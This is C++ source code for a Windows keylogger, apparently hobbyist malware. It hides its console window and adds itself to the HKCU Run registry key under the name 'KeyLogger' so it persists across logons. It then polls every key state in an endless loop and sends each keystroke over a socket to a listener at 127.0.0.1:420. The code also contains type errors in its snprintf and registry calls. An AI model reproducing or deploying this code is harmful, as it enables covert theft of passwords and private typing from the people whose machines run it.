#include <Windows.h>

#include "client.h"

#pragma comment(lib, "wininet.lib")
#pragma comment (lib, "Ws2_32.lib")

int main(int argc, char** argv) {
	FreeConsole();

	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	LONG status = RegSetValueEx(hkey, L"KeyLogger", 0, REG_SZ, (BYTE*)argv[0], (std::string(argv[0]).size() + 1) * sizeof(wchar_t));

	char key = 'A';
	client* connection = new client;
	connection->initialize("127.0.0.1", 420);
	while (true) {
		for (int key = 8; key <= 190; key++) {
			const auto state
				= GetAsyncKeyState(key);
			if (state == -32767) {
				char keyBuffer[4];
				snprintf(keyBuffer, 4, "%s", std::to_string(key));
				send(connection->csocket, keyBuffer, sizeof(keyBuffer), NULL);
				printf("Send key %i\n", key);
			}
		}
	}
}
